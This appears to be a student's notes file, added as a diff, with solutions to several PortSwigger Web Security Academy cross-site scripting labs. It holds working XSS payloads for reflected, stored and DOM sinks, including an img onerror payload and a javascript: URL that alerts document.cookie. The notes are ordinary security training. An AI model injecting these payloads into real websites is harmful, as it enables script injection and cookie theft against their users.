@@ -1,0 +1,39 @@
+TAsk 1:
+///Lab: Reflected XSS into HTML context with nothing encoded///
+
+https://0a0e0008030a352f8093037b004800e0.web-security-academy.net/ >>>into searchbar: <script>alert(1)</script>
+
+
+Task 2:
+///Lab: Stored XSS into HTML context with nothing encoded///
+
+Make a post with the wollowing comment: <script>alert(1)</script>
+
+Task 3:
+///Lab: DOM XSS in document.write sink using source location.search///
+
+<img src="/resources/images/tracker.gif?searchTerms=asd"> >>> into the searchbar: "><script>alert(1)</script>
+
+Task 4:
+///Lab: DOM XSS in innerHTML sink using source location.search///
+
+<img src=1 onerror=alert(1)> >>into the search bar...this is an image caller funcion, it tries to load in a picture, with the source 1 (which will run on an error) and if its run on an error it calls the onerror script 
+which will run immediately the value which will be alert(1).
+
+Task 5:
+///Lab: DOM XSS in jQuery anchor href attribute sink using location.search source///
+
+"To solve this lab, make the "back" link alert document.cookie." >>we have a submit feedback option with the following url:
+https://0ad2007c04949dd880030349002a0057.web-security-academy.net/feedback?returnPath=/
+In the source:<a id="backLink" href="/">Back</a>
+Change the url like this:
+https://0ad2007c04949dd880030349002a0057.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
+It changes the href attribute, and when you click on the "back" button the alert will pop up.
+
+Task 6:
+///Lab: DOM XSS in jQuery selector sink using a hashchange event///
+
+
+
+
+
